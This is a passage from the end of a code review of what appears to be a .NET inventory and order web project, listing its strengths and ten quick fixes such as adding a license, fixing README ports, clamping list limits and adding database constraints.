- **Seed data that tells a story** — the deliberately low-stock and critical-stock items make the dashboard demo meaningful.
- **Docs before code.** A PRD, HLD, schema, API spec and test matrix ahead of implementation is rare and genuinely valuable — it just needs to describe the *current* state, not the aspiration.
- **Commit discipline.** The history actually follows the Conventional Commits + `feat/test` branch convention it documents (`test(orders): …`, `merge: feat(…) into develop`).

---

## 10. Quick wins (≤ 1 hour each)

1. Add `LICENSE` (MIT) — the badge currently lies.
2. Fix README ports (`5196` / `7299`) and the `.http` sample (`/api/Products`).
3. Clamp `limit` to `1..200` in both list endpoints.
4. `[Range(1, int.MaxValue)]` on `ProductId`; drop the meaningless `[Required]` on ints.
5. Remove `Moq` and `coverlet.collector`, **or** wire coverage collection — do not keep unused test infrastructure.
6. Add `HasCheckConstraint("QuantityOnHand >= 0")` and a `RowVersion` column in one migration.
7. Set `Product = product` on `OrderItem` (one line, fixes the 201 response).
8. Replace `showNewProductModal` with a real modal or delete the button.
9. Add `AddProblemDetails()` + `traceId` to the error response.
10. Add a `CHANGELOG.md` and a "Status: prototype / known limitations" block at the top of the README.

---

*End of review. No source files were modified; this document is the only artefact produced.*
